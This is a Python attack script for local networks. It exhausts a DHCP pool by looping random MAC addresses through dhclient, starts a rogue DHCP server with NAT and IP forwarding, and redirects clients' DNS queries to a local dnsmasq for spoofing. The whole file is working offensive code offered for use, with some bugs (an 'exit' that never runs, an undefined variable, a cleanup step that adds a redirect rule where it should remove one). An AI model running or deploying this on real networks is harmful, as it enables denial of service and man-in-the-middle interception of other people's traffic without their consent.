import os
import argparse
import subprocess
from scapy.all import RandMAC

run = subprocess.check_output('whoami')
user = run.decode("UTF-8")
if user.split("\n",2)[0] != "root":
	print('This script must be executed as root.')
	exit;

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", type=str, help="Set interface for the attack")
parser.add_argument("-m", "--mask", type=int, help="Set network mask (30,24,16,8,4)", action='store')
parser.add_argument("-r", "--rogue", help="Start a rogue DHCP Server", action='store_true')
parser.add_argument("-d", "--dnsspoof", help="Prepares dnsmasq for DNS Spoofing", action='store_true')
parser.add_argument("-c", "--clean", help="Removes config from previous uses", action='store_true')
args = parser.parse_args()

inter = str(args.interface)
if args.mask is not  None:
	mask = args.mask
	bits = 32 - mask
	rolls = pow(2,bits)
rogue = args.rogue
dns = args.dnsspoof
clean = args.clean

def starvation(inter, rolls):
	for i in range(1, rolls):
		kill = "kill -9 $(pidof dhclient " + inter + ")"
		os.system(kill)
		mac = str(RandMAC())
		chmac = "ip l s dev " + inter + " addr " + mac
		os.system(chmac)
		dhcp = "dhclient " + inter
		os.system(dhcp)

def dhcp_rogue(inter):
	raw = subprocess.check_output('cat /etc/*-release | grep ID | cut -d "=" -f 2', shell=True)
	distro = raw.decode("UTF-8")
	os.system('ip a a 172.16.0.10/24 dev ' + inter)
	os.system('ip r a default via 172.16.0.1')
	if distro.split("\n",2)[0] == "arch" or distro.split("\n",2)[0] == "manjaro":
		out = subprocess.check_output('pacman -Q dhcp | cut -d " " -f 1', shell=True)
		pkg = out.decode("UTF-8")
		if pkg.split("\n",2)[0] == "dhcp":
			os.system('cp -f fake-dhcp.conf /etc/dhcpd.conf')
			os.system('cp -f /usr/lib/systemd/system/dhcpd4.service /etc/systemd/system/dhcpd4@.service')
			os.system('systemctl start dhcpd4')
		else:
			os.system('pacman -S dhcp --noconfirm')
			os.system('cp -f fake-dhcp.conf /etc/dhcpd.conf')
			os.system('cp -f /usr/lib/systemd/system/dhcpd4.service /etc/systemd/system/dhcpd4@.service')
			os.system('systemctl start dhcpd4')
	elif distro.split("\n",2)[0] == "debian" or distro.split("\n",2)[0] == "ubuntu" or distro.split("\n",2)[0] == "kali":
		out = subprocess.check_output('apt list --installed | grep isc-dhcp-server | cut -d "/" -f 1', shell=True)
		pkg = out.decode("UTF-8")
		if pkg.split("\n",2)[0] == "isc-dhcp-server":
			os.system('cp -f fake-dhcp.conf /etc/dhcp/dhcpd.conf')
			os.system('mv /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.old')
			os.system('cp rogue /etc/default/isc-dhcp-server')
			os.system('systemctl start isc-dhcp-server')
		else:
			os.system('apt -y install isc-dhcp-server')
			os.system('cp -f fake-dhcp.conf /etc/dhcp/dhcpd.conf')
			os.system('echo INTERFACESv4="' + inter +  '" > /etc/default/isc-dhcp-server')
			os.system('systemctl start isc-dhcp-server')
	elif distro.split("\n",2)[0] == "fedora" or distro.split("\n",2)[0] == "rhel" or distro.split("\n",2)[0] == "centos":
		os.system('dnf list dhcp')

		if pkg.split("\n",2)[0] == "isc-dhcp-server":
			os.system('cp -f fake-dhcp.conf /etc/dhcp/dhcpd.conf')
			os.system('systemctl start dhcpd')
		else:
			os.system('dnf -y install dhcp')
			os.system('cp -f fake-dhcp.conf /etc/dhcp/dhcpd.conf')
			os.system('systemctl start dhcpd')

	os.system('iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -j MASQUERADE')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def dns_spoof():
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -s 172.16.0.0/24 -j DNAT --to-destination 127.0.0.1:53')	
	os.system('cp /etc/dnsmasq.conf /etc/dnsmasq.conf.example')
	os.system('cp dnspoof.conf /etc/dnsmasq.conf')
	os.system('cp /etc/resolv.conf /etc/resolv.conf.original')
	os.system('cp resolv.conf /etc/resolv.conf')
	os.system('systemctl start dnsmasq')

def clean(inter):
	raw = subprocess.check_output('cat /etc/*-release | grep ID | cut -d "=" -f 2', shell=True)
	distro = raw.decode("UTF-8")
	if distro.split("\n",2)[0] == "arch" or distro.split("\n",2)[0] == "manjaro":
		os.system('systemctl stop dhcpd4')
	elif distro.split("\n",2)[0] == "debian" or distro.split("\n",2)[0] == "ubuntu" or distro.split("\n",2)[0] == "kali":
		os.system('systemctl stop isc-dhcp-server')
		os.system('cp /etc/default/isc-dhcp-server.old /etc/default/isc-dhcp-server')
	elif distro.split("\n",2)[0] == "fedora" or distro.split("\n",2)[0] == "rhel" or distro.split("\n",2)[0] == "centos":
		os.system('systemctl stop dhcpd')
	os.system('iptables -t nat -D POSTROUTING -s 172.16.0.0/24 -j MASQUERADE')
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
	os.system('ip a a 172.16.0.1 dev ' + inter)
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -s 172.16.0.0/24 -j DNAT --to-destination 172.16.0.1:53')
	os.system('systemctl stop dnsmasq')
	os.system('cp /etc/dnsmasq.conf.example /etc/dnsmasq.conf')
	os.system('cp /etc/resolv.conf.original /etc/resolv.conf')

if args.mask is not None and args.interface is not None:
	starvation(inter, rolls)

if rogue == True:
	dhcp_rogue(inter)

if dns == True:
	dns_spoof()

if clean == True and inter is not None:
	clean(inter)

